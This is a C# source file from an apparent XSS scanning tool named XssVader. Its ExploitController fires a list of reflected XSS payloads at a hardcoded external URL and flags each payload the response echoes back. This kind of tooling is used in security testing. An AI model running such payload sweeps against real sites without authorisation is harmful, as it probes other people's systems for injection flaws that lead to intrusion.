using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using XssVader.Controllers;
using XssVader.Models;

namespace XssVader.Controllers
{
    internal class ExploitController
    {
        private readonly XssController _xssController;
        private readonly RequestController _requestController;
        private readonly LogController _log;
        private readonly XssModel _xssReflected;
        private readonly MessageController _messageController;
        public ExploitController()
        {
            _log = new LogController();
            _xssController = new XssController();
            _requestController = new RequestController();
            _messageController = new MessageController();
        }
        public async Task ReflectedXss()
        {
            var xssPayloadList = _xssController.GetReflectedPayloads();

            _messageController.ShowMessageYellow($"[+] Testing {xssPayloadList.Type} XSS payloads on target");

            foreach (var payload in xssPayloadList.Payloads)
            {
                try
                {
                    string response = await _requestController.RequestHandle($"http://www.bancocn.com/cat.php?id={payload}");

                    if (response.Contains(payload))
                    {   
                        Console.Write($"- Target can be vulnerable by: ");
                        _messageController.ShowMessageBlue(payload);
                    }
                }
                catch (Exception e)
                {
                    _log.LogError($"{e.Message} : {payload}"); 
                }
            }
        }
    }
}
